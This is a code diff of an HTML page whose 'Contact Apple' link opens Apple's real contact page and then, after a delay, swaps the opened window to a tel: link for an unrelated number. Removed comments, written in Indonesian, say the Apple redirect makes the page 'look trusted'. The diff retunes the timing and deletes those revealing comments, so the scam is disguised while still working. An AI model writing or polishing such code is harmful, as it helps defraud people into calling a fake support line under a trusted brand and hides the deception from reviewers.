@@ -6,20 +6,15 @@
 </head>
 <body>
     <u><a id="contact" onclick="contactSite()">Contact Apple</a></u>
-
     <script type="text/javascript">
         function contactSite() {
             var x = window.open("https://www.apple.com/contact");
-
-            // Timing lebih stabil: 2300ms
             setTimeout(function() {
-                try { x.location.href = "tel:+123456789"; } catch (e) {}
-            }, 2300);
-
-            // Redirect ke Apple agar terlihat trusted, jangan lama-lama
+                x.location.href = "tel:+123456789";
+            }, 3000);
             setTimeout(function() {
                 location.href = "https://www.apple.com/contact";
-            }, 900);
+            }, 1500);
         }
     </script>
 </body>
